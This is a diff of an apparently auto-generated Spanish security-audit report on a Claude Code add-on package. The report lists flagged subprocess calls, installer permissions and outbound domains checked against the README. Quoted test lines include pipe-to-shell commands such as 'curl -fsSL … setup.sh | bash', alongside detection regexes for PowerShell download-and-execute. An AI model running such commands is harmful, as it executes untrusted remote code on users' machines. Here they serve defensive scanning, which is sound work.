-- `pruebas/test_taller.py:127` llamada a subprocess/os.system/eval/exec: `except subprocess.TimeoutExpired:`
-- `pruebas/test_taller.py:169` llamada a subprocess/os.system/eval/exec: `r = subprocess.run([sys.executable, str(SCRIPT), '--puerto', '0'],`
-- `pruebas/test_taller.py:236` llamada a subprocess/os.system/eval/exec: `r = subprocess.run([sys.executable, str(SCRIPT), '--no-existe', 'x'],`
-- `pruebas/test_vigia_dominios.py:12` llamada a subprocess/os.system/eval/exec: ``choco`, `Invoke-Expression`, `powershell -enc`) cuya fuente no está en el turno.`
-- `pruebas/test_vigia_dominios.py:64` descarga con tubería a un intérprete (curl/wget/iwr/irm | bash/sh/iex): `'Instálala así:\n```\ncurl -fsSL https://otro-sitio-desconocido.io/setup.sh | bash\n```',`
-- `pruebas/test_vigia_dominios.py:73` descarga con tubería a un intérprete (curl/wget/iwr/irm | bash/sh/iex): `self.assertTrue(any('curl' in c and '| bash' in c for c in cazas['comandos']), cazas['comandos'])`
-- `pruebas/test_vigia_dominios.py:81` descarga con tubería a un intérprete (curl/wget/iwr/irm | bash/sh/iex): `comando = 'curl -fsSL https://paquete-de-siempre.com/instalar.sh | bash'`
+- `abyss/vigia.py:150` llamada a subprocess/os.system/eval/exec: `r'|\b(?:iwr|invoke-webrequest|irm|invoke-restmethod)\b[^\n|]*\|\s*(?:iex|invoke-expression)\b'`
+- `abyss/vigia.py:152` llamada a subprocess/os.system/eval/exec: `r'|\bwinget\s+install\b|\bchoco(?:latey)?\s+install\b|\bInvoke-Expression\b'`
+- `abyss/vigia.py:318` descarga con tubería a un intérprete (curl/wget/iwr/irm | bash/sh/iex): `# `respuesta`, no `sin_codigo`) — un `curl … | bash` suele venir precisamente`
 
 ## 3 · Permisos
 - Declara cómo deshacerlo en algún README: True
@@ -249,71 +92,86 @@ suspenda"), no un fallo de este informe.
 - `instalar.py:16`: `(`settings.json.abyss-AAAAMMDD-HHMMSS.bak`).`
 - `instalar.py:32`: `imprime todos con su estado real leído de `settings.json`.`
 - `instalar.py:40`: `Comunes a instalar/desinstalar: `--settings <ruta>` (pruebas, o un settings.json`
-- `instalar.py:52`: `está `~/.claude`, qué proyecto, qué `python`) se resuelve en tiempo de ejecución.`
-- `instalar.py:67`: `SETTINGS_POR_DEFECTO = os.path.join(os.path.expanduser('~'), '.claude', 'settings.json')`
-- `instalar.py:72`: `# carpeta de skills del usuario, igual que `~/.claude/settings.json` es la carpeta`
-- `instalar.py:80`: `SKILLS_DIR_POR_DEFECTO = os.path.join(os.path.expanduser('~'), '.claude', 'skills')`
-- `instalar.py:111`: `# `claves` son claves de nivel superior en settings.json que se fijan SOLO si el`
-- `instalar.py:117`: `# en ningún `settings.json` real encontrado en esta máquina — se quitó el 6-sep tras`
-- `instalar.py:187`: `'en el mismo paquete, sin módulo de instalación propio (sin gancho, no toca settings.json). '`
-- `instalar.py:262`: `toca='copia skills/esceptico/ a <skills-dir>/esceptico/ (por defecto ~/.claude/skills/esceptico/, '`
-- `instalar.py:263`: `'ver --skills-dir); no es Python, no toca settings.json ni mem',`
-- `instalar.py:284`: `linea='Da permiso de Edit sobre tu settings.json (autoedición). APAGADO por defecto.',`
-- `instalar.py:285`: `toca='clave permissions.allow += "Edit(<settings.json>)"',`
-- `instalar.py:286`: `hooks=[], aviso='deja que el propio asistente edite settings.json sin preguntar cada vez.'),`
-- `instalar.py:296`: `# JSON con backup: leer/escribir settings.json y el manifiesto siempre por aquí.`
-- `instalar.py:311`: `cada `\\n` del texto a `\\r\\n` al escribir, así que un `settings.json` de`
+- `instalar.py:53`: `está `~/.claude`, qué proyecto, qué `python`) se resuelve en tiempo de ejecución.`
+- `instalar.py:151`: `SETTINGS_POR_DEFECTO = os.path.join(os.path.expanduser('~'), '.claude', 'settings.json')`
+- `instalar.py:156`: `# carpeta de skills del usuario, igual que `~/.claude/settings.json` es la carpeta`
+- `instalar.py:164`: `SKILLS_DIR_POR_DEFECTO = os.path.join(os.path.expanduser('~'), '.claude', 'skills')`
+- `instalar.py:195`: `# `claves` son claves de nivel superior en settings.json que se fijan SOLO si el`
+- `instalar.py:201`: `# en ningún `settings.json` real encontrado en esta máquina — se quitó el 6-sep tras`
+- `instalar.py:301`: `'en el mismo paquete, sin módulo de instalación propio (sin gancho, no toca settings.json). '`
+- `instalar.py:323`: `"no install module of its own (no hook, doesn't touch settings.json). Optional: "`
+- `instalar.py:460`: `'cámara se enciende a petición explícita, nunca por gancho; no toca settings.json ni mem. '`
+- `instalar.py:465`: `"touch settings.json or mem. Needs opencv-python, numpy and Pillow, and hands need "`
+- `instalar.py:476`: `'a petición explícita, nunca por gancho; no toca settings.json ni mem',`
+- `instalar.py:481`: `"turned on by explicit request, never by a hook; doesn't touch settings.json or mem"),`
+- `instalar.py:488`: `toca='copia skills/esceptico/ a <skills-dir>/esceptico/ (por defecto ~/.claude/skills/esceptico/, '`
+- `instalar.py:489`: `'ver --skills-dir); no es Python, no toca settings.json ni mem',`
 
 ## 4 · Qué sale de la máquina
-- `aihorde.net` — **sin nombrar en el README**: abyss/imagen.py:225, abyss/imagen.py:307
-- `api.artic.edu` — **sin nombrar en el README**: abyss/mundo.py:151
-- `api.cloudflare.com` — **sin nombrar en el README**: abyss/imagen.py:175, abyss/imagen.py:306
-- `api.declarado.com` — **sin nombrar en el README**: pruebas/test_auditar.py:359
-- `api.oculto.net` — **sin nombrar en el README**: pruebas/test_auditar.py:369, pruebas/test_auditar.py:370
-- `api.open-meteo.com` — **sin nombrar en el README**: abyss/exterocepcion.py:192
-- `api.openverse.org` — **sin nombrar en el README**: abyss/imagen.py:327
-- `api.sinesquema.io` — **sin nombrar en el README**: pruebas/test_auditar.py:392
-- `api.together.xyz` — **sin nombrar en el README**: abyss/imagen.py:200, abyss/imagen.py:306
-- `api.windy.com` — **sin nombrar en el README**: abyss/mundo.py:285
-- `artic.edu` — **sin nombrar en el README**: abyss/mundo.py:156, abyss/mundo.py:168, pruebas/test_mundo.py:109
-- `collectionapi.metmuseum.org` — **sin nombrar en el README**: abyss/mundo.py:120, abyss/mundo.py:130
-- `commons.wikimedia.org` — **sin nombrar en el README**: abyss/imagen.py:332, abyss/mundo.py:182
-- `copia-sospechosa.example` — **sin nombrar en el README**: pruebas/test_auditar.py:407
-- `copia.ejemplo.com` — **sin nombrar en el README**: abyss/vigia.py:154
-- `de-terceros.example.com` — **sin nombrar en el README**: pruebas/test_auditar.py:386
-- `discourse.threejs.org` — **sin nombrar en el README**: abyss/render3d.py:586, pruebas/test_render3d.py:331, pruebas/test_render3d.py:340
-- `dominio-copia-falsa.net` — **sin nombrar en el README**: pruebas/test_vigia_dominios.py:42
-- `dominio-jamas-visto.xyz` — **sin nombrar en el README**: pruebas/test_vigia_dominios.py:103
-- `dominio-legitimo.com` — **sin nombrar en el README**: pruebas/test_vigia_dominios.py:38, pruebas/test_vigia_dominios.py:41
-- `download.pytorch.org` — **sin nombrar en el README**: abyss/taller.py:83
-- `e.org` — **sin nombrar en el README**: pruebas/test_mundo.py:334
-- `ejemplo.com` — **sin nombrar en el README**: pruebas/test_auditar.py:416
-- `ejemplo.es` — **sin nombrar en el README**: pruebas/test_lectura_visual.py:335
-- `ejemplo.org` — **sin nombrar en el README**: pruebas/test_mundo.py:305
-- `es.wikipedia.org` — **sin nombrar en el README**: abyss/mundo.py:334
-- `gen.pollinations.ai` — **sin nombrar en el README**: abyss/imagen.py:163, abyss/imagen.py:305
-- `geocoding-api.open-meteo.com` — **sin nombrar en el README**: abyss/exterocepcion.py:129
-- `github.com` — **sin nombrar en el README**: abyss/lectura_visual.py:334, pruebas/test_auditar.py:47, pruebas/test_auditar.py:193, pruebas/test_auditar.py:231, pruebas/test_manifiestos_plugin.py:13
+- `...` — nombrado en el README: abyss/kinetica.py:596
+- `aihorde.net` — nombrado en el README: abyss/imagen.py:225, abyss/imagen.py:307, plantillas/imagen_config.json:34
+- `apache.org` — nombrado en el README: instalar.py:872, instalar.py:895, instalar.py:901, instalar.py:1093
+- `api.artic.edu` — nombrado en el README: abyss/mundo.py:151
+- `api.cloudflare.com` — nombrado en el README: abyss/imagen.py:175, abyss/imagen.py:306
+- `api.open-meteo.com` — nombrado en el README: abyss/exterocepcion.py:197
+- `api.openverse.org` — nombrado en el README: abyss/imagen.py:327
+- `api.together.xyz` — nombrado en el README: abyss/imagen.py:200, abyss/imagen.py:306
+- `api.windy.com` — nombrado en el README: abyss/mundo.py:285
+- `artic.edu` — nombrado en el README: abyss/mundo.py:156, abyss/mundo.py:168
+- `audi.com` — nombrado en el README: abyss/kinetica.py:456
+- `cdn.jsdelivr.net` — nombrado en el README: instalar.py:659, instalar.py:662, instalar.py:665, instalar.py:668, instalar.py:671
+- `collectionapi.metmuseum.org` — nombrado en el README: abyss/mundo.py:120, abyss/mundo.py:130
+- `commons.wikimedia.org` — nombrado en el README: abyss/imagen.py:332, abyss/mundo.py:182
+- `copia.ejemplo.com` — nombrado en el README: abyss/vigia.py:159
+- `developers.cloudflare.com` — nombrado en el README: plantillas/imagen_config.json:46, plantillas/imagen_config.json:51
+- `developers.google.com` — nombrado en el README: plantillas/imagen_config.json:69
+- `discourse.threejs.org` — nombrado en el README: abyss/render3d.py:610
+- `docs.together.ai` — nombrado en el README: plantillas/imagen_config.json:57
+- `download.pytorch.org` — nombrado en el README: instalar.py:775, abyss/taller.py:83
+- `enter.pollinations.ai` — nombrado en el README: plantillas/imagen_config.json:40
+- `es.wikipedia.org` — nombrado en el README: abyss/mundo.py:334
+- `fujifilm.com` — nombrado en el README: abyss/kinetica.py:455
+- `gen.pollinations.ai` — nombrado en el README: abyss/imagen.py:163, abyss/imagen.py:305
+- `geocoding-api.open-meteo.com` — nombrado en el README: abyss/exterocepcion.py:134
+- `github.com` — nombrado en el README: abyss/fondo.py:63, abyss/lectura_visual.py:333
+- `global.canon` — nombrado en el README: abyss/kinetica.py:453
 - `google.com` — nombrado en el README: abyss/mundo.py:238
-- `graph.mapillary.com` — **sin nombrar en el README**: abyss/mundo.py:256
-- `images.metmuseum.org` — **sin nombrar en el README**: pruebas/test_mundo.py:407
-- `ipinfo.io` — nombrado en el README: abyss/exterocepcion.py:116, pruebas/test_presupuesto_red.py:66, pruebas/test_presupuesto_red.py:74
-- `mapillary.com` — **sin nombrar en el README**: abyss/mundo.py:269
-- `maps.googleapis.com` — **sin nombrar en el README**: abyss/mundo.py:226, abyss/mundo.py:233
-- `news.google.com` — nombrado en el README: abyss/noticias.py:158, abyss/noticias.py:179, abyss/noticias.py:214, abyss/noticias.py:226, pruebas/test_presupuesto_red.py:88, pruebas/test_presupuesto_red.py:94
-- `nominatim.openstreetmap.org` — nombrado en el README: abyss/exterocepcion.py:136
-- `otro-sitio-desconocido.io` — **sin nombrar en el README**: pruebas/test_vigia_dominios.py:64
-- `paquete-de-siempre.com` — **sin nombrar en el README**: pruebas/test_vigia_dominios.py:81
-- `router.huggingface.co` — **sin nombrar en el README**: abyss/imagen.py:212, abyss/imagen.py:307
-- `telemetria.dominio-no-declarado.net` — **sin nombrar en el README**: pruebas/datos/paquete_sintetico/malo.py:12
-- `tercera.example.net` — **sin nombrar en el README**: pruebas/test_auditar.py:399
-- `threejs.org` — **sin nombrar en el README**: abyss/render3d.py:585, pruebas/test_render3d.py:330, pruebas/test_render3d.py:339
-- `w3.org` — **sin nombrar en el README**: abyss/infografia.py:148, abyss/render3d.py:578, pruebas/test_infografia.py:22, pruebas/test_render3d.py:52, pruebas/test_render3d.py:332, pruebas/test_render3d.py:345, pruebas/test_render3d.py:347
-- `wikidata.org` — **sin nombrar en el README**: abyss/mundo.py:319, abyss/mundo.py:330
-- `windy.com` — **sin nombrar en el README**: abyss/mundo.py:298
-- `x.example.com` — **sin nombrar en el README**: pruebas/test_auditar.py:312
+- `graph.mapillary.com` — nombrado en el README: abyss/mundo.py:256
+- `hasselblad.com` — nombrado en el README: abyss/kinetica.py:451
+- `huggingface.co` — nombrado en el README: plantillas/imagen_config.json:63
+- `ipinfo.io` — nombrado en el README: abyss/exterocepcion.py:121
+- `leica-camera.com` — nombrado en el README: abyss/kinetica.py:450
+- `mapillary.com` — nombrado en el README: abyss/mundo.py:269, plantillas/imagen_config.json:75
+- `maps.googleapis.com` — nombrado en el README: abyss/mundo.py:226, abyss/mundo.py:233
+- `news.google.com` — nombrado en el README: abyss/noticias.py:163, abyss/noticias.py:184, abyss/noticias.py:219, abyss/noticias.py:231
+- `nikon.com` — nombrado en el README: abyss/kinetica.py:454
+- `nominatim.openstreetmap.org` — nombrado en el README: abyss/exterocepcion.py:141
+- `router.huggingface.co` — nombrado en el README: abyss/imagen.py:212, abyss/imagen.py:307
+- `sony.com` — nombrado en el README: abyss/kinetica.py:452
+- `storage.googleapis.com` — nombrado en el README: instalar.py:674
+- `threejs.org` — nombrado en el README: abyss/render3d.py:609
+- `vivo.com` — nombrado en el README: abyss/kinetica.py:448
+- `w3.org` — nombrado en el README: abyss/infografia.py:148, abyss/render3d.py:602
+- `wikidata.org` — nombrado en el README: abyss/mundo.py:319, abyss/mundo.py:330
+- `windy.com` — nombrado en el README: abyss/mundo.py:298
+- `zeiss.com` — nombrado en el README: abyss/kinetica.py:449
+
+Terceros embebidos bajo `vendor/`, `dist/` o `build/` — leídos APARTE, nunca contra el README de este paquete (no son código propio):
+- `apache.org`: abyss/vendor/modelos/LICENSE-u2netp.txt:60, abyss/vendor/modelos/LICENSE-u2netp.txt:252, abyss/vendor/mp/LICENSE-mediapipe.txt:17, abyss/vendor/mp/LICENSE-mediapipe.txt:23, abyss/vendor/mp/LICENSE-mediapipe.txt:215
+- `cdnjs.cloudflare.com`: abyss/vendor/LICENSE-three.txt:8
+- `discourse.threejs.org`: abyss/vendor/three.min.js:7
+- `github.com`: abyss/vendor/LICENSE-three.txt:10, abyss/vendor/modelos/LICENSE-u2netp.txt:5
+- `raw.githubusercontent.com`: abyss/vendor/LICENSE-three.txt:11, abyss/vendor/modelos/LICENSE-u2netp.txt:12, abyss/vendor/modelos/LICENSE-u2netp.txt:19
+- `threejs.org`: abyss/vendor/three.min.js:1
+- `w3.org`: abyss/vendor/three.min.js:7
 
 ## 5 · Dominio (lectura manual)
 - este guion NO dice si un dominio es legítimo; solo los reúne para lectura carácter a carácter — contra eso solo vale leer, no un regex.
 
-`github.com`, `pytorch.org`
+`download.pytorch.org`, `github.com`, `pytorch.org`
+
+## 6 · Qué no leyó esta vara (declarado, no medido)
+- solo estas extensiones, en código y datos: .bat, .cfg, .cjs, .cmd, .env, .go, .ini, .js, .json, .jsx, .mjs, .ps1, .py, .rb, .sh, .toml, .ts, .tsx, .txt, .yaml, .yml — cualquier otra (compilados, binarios, formatos propios de otra herramienta...) no se lee
+- carpetas nunca leídas, ni siquiera como terceros: .git, .hg, .svn, .venv, __pycache__, node_modules, site-packages, venv
+- vendor/dist/build: 7 host(s) ahí dentro, leídos APARTE como terceros embebidos (nunca contra el README de este paquete): apache.org, cdnjs.cloudflare.com, discourse.threejs.org, github.com, raw.githubusercontent.com, threejs.org, w3.org
+- una URL partida en dos líneas por concatenación de cadenas no se reconoce: es un regex sobre texto, no un parser
